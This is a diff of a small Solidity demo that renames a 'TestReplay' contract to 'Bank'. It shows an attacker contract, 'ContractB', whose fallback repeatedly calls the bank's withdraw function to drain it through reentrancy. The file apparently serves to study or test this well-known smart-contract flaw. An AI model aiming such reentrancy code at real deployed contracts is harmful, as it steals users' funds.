@@ -2,7 +2,7 @@
 pragma solidity ^0.8.0;
 
 
-contract TestReplay {
+contract Bank {
     mapping(address => uint) public deposits;
     bool public locked;
 
@@ -32,23 +32,23 @@ contract TestReplay {
 }
 
 contract ContractB {
-    TestReplay public a;
+    Bank public bank;
 
     constructor(address _a) {
-        a = TestReplay(_a);
+        bank = Bank(_a);
     }
 
     // 
     fallback() external payable {
-        if (address(a).balance >= 1 ether) {
-            a.withdraw();
+        if (address(bank).balance >= 1 ether) {
+            bank.withdraw();
         }
     }
 
     function attack() external payable {
         require(msg.value >= 1 ether);
-        a.deposit{value: 1 ether}();
-        a.withdraw();
+        bank.deposit{value: 1 ether}();
+        bank.withdraw();
     }
 
     function getBalance() public view returns (uint) {
